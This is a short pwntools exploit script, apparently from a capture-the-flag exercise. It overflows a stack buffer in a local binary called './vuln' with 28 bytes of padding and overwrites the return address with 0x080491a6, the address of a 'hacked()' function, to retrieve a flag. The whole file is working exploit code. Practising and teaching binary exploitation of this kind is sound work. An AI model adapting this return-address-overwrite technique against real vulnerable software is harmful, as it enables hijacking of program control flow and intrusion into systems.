#!/bin/python3
from pwn import *

# Set up pwntools for the correct architecture
exe = './vuln'

io = process(exe)

# How many bytes to the instruction pointer (EIP)?
padding = 28

payload = flat(
    b'A' * padding,
    0x080491a6  #hacked()
)

# Send the payload
io.sendlineafter(b':', payload)

io.recvline()
io.recvline()

try: print(io.recvline().decode())
except: print("No ha devuelto la flag :(")
# Receive the flag
io.close()
